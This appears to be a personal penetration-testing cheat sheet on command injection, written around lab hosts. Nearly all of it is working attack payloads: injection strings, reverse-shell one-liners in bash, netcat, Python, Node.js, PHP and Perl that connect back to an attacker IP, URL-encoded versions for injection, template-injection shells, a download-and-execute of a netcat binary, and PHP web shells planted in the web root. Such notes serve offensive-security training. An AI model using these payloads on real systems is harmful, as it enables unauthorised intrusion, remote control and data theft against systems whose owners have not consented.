# **Command Injection**

#### **When to Test for Command Injection**
1. Form inputs that accept filenames, IP addresses, or system commands
2. Search boxes
3. URL parameters or query strings
4. File upload / export / File management features

#### **Tools**
- [Commix](https://github.com/commixproject/commix)
```
commix -r saved_request.txt
commix -r saved_request.txt -p <suspected_param>
commix -r saved_request.txt --level=1 --technique=c

commix -r saved_request.txt --level=1 --technique=c,e,t

c: Classic
e, Eval‑based
t: Time‑based
f: File‑based
d: Dynamic eval
```

- [Online Reverse Shell Generator](https://www.revshells.com/)
- [Pentest Monkey - PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

#### **Payloads**
```
ip=127.0.0.1|id
ip=127.0.0.1|i$()d
ip=127.0.0.1;wh$()oami

time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"

```
#### Common Capability Checks
- Linux 

| Command   | Used For                                      |
|-----------|-----------------------------------------------|
| wget      | File Transfer                                 |
| curl      | File Transfer                                 |
| fetch     | File Transfer                                 |
| gcc       | Compilation                                   |
| cc        | Compilation                                   |
| nc        | Shells, File Transfer, Port Forwarding        |
| socat     | Shells, File Transfer, Port Forwarding        |
| ping      | Networking, Code Execution Verification       |
| netstat   | Networking                                   |
| ss        | Networking                                   |
| ifconfig  | Networking                                   |
| ip        | Networking                                   |
| hostname  | Networking                                   |
| php       | Shells, Code Execution                       |
| python    | Shells, Code Execution                       |
| python3  | Shells, Code Execution                       |
| perl      | Shells, Code Execution                       |
| java      | Shells, Code Execution                       |


- Windows 

| Capability     | Used For                                                     |
|----------------|--------------------------------------------------------------|
| PowerShell     | Code Execution, Enumeration, Movement, Payload Delivery     |
| Visual Basic   | Code Execution, Enumeration, Movement, Payload Delivery     |
| tftp           | File Transfer                                               |
| ftp            | File Transfer                                               |
| certutil       | File Transfer                                               |
| Python         | Code Execution, Enumeration                                |
| .NET           | Code Execution, Privilege Escalation, Payload Delivery      |
| ipconfig       | Networking                                                  |
| netstat        | Networking                                                  |
| hostname       | Networking                                                  |
| systeminfo     | System Information, Patches, Versioning, Architecture, etc.|

- Create capability_checks_custom.txt to fuzz to find out which utilites are available in target machine to achieve reverse shell.
```
w00tw00t
wget
curl
fetch
gcc
cc
nc
socat
ping
netstat  
ss
ifconfig
ip
hostname
php
python
python3
perl
java
```

```
wfuzz -c -z file,/home/amrityam/kali/offsec/capability_checks_custom.txt --hc 404 "http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which FUZZ"
```

#### **Obataining Reverse Shell**
Set up a a Netcat listener on port 9090.
```
nc -nlvp 9090
```

##### **Bash**
```
bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1

URL-encode:
bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.51/9090+0>%261'

http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.51/9090+0>%261'
```

##### **Netcat**
```
/bin/nc -nv 192.168.49.51 9090 -e /bin/bash

URL-encode:
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|/bin/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
```

```
${self.module.cache.util.os.popen('which python3  which python  which perl  which nc  which busybox || which sh').read()}

${self.module.cache.util.os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 443 >/tmp/f")}
```

```
{{[0]|reduce('system', 'which python3  which python  which perl  which nc  which busybox || which bash')}}

{{[0]|reduce('system','nc 192.168.45.226 443 -e /bin/bash')}} 
```

##### **Python**
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.51",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

URL-encode:
http://ci-sandbox/php/index.php?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

```
import os,pty,socket;s=socket.socket();s.connect(("192.168.45.165",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
```

##### **Node.js**
```
echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js

URL-encode:
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20192.168.49.51%209090%20-e%20%2Fbin%2Fbash%27)%22%20%3E%20%2Fvar%2Ftmp%2Foffsec.js%20%3B%20node%20%2Fvar%2Ftmp%2Foffsec.js
```

##### **PHP**
- Intresting endpoint to check: /phpinfo.php
- PHP one-liner reverse shell payloads
```
php -r '$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

Example:
```
http://ci-sandbox/php/index.php?ip=127.0.0.1;php -r "system(\"bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'\");"

URL-encode:
http://ci-sandbox/php/index.php?ip=127.0.0.1;php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27%5C%22)%3B%22
```

##### **Perl**
```
perl -e 'use Socket;$i="192.168.49.51";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

URL-encode:
http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.49.51%22%3B%24p%3D9090%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
```

##### **File Transfer**
If we are unable to run any kind of system shell from the target system's command-line, then our goal will be to instruct the target to download a binary that we can run to send a shell to our Netcat listener.

- The Netcat binary is located at /bin/nc. Let's copy it to our local web root with cp:
```
sudo cp /bin/nc /var/www/html/
sudo service apache2 start
```

- Payload
```
wget http://192.168.49.51:80/nc -O /var/tmp/nc ; chmod 755 /var/tmp/nc ; /var/tmp/nc -nv 192.168.49.51 9090 -e /bin/bash

URL-encode:
wget%20http://192.168.49.51:80/nc%20-O%20/var/tmp/nc%20;%20chmod%20755%20/var/tmp/nc%20;%20/var/tmp/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
```

##### **Web Shell**
If we don't have access to unique binaries but happen to know the web technology in use (such as PHP in this example), we can write our own backdoor to achieve a shell with a web shell.

Example:
-Create our web shell in the web root of the target (/var/www/html/).
```
echo+"<pre><?php+passthru(\$_GET['cmd']);+?></pre>"+>+/var/www/html/webshell.php
```

```
http://ci-sandbox:80/php/index.php?ip=127.0.0.1;pwd

http://ci-sandbox:80/php/index.php?ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthru(\$_GET[%27cmd%27]);+?%3E%3C/pre%3E%22+%3E+/var/www/html/webshell.php

http://ci-sandbox:80/webshell.php?cmd=ls -lsa
```

```
1';copy(select '<?php passthru($_GET[''cmd'']);?>') to '/var/tmp/cmd.php'; 

http://192.168.152.121/backups/cmd.php?cmd=ls
```

##### **OS Command Injection**
```
C:\backup"&type C:\proof.txt
```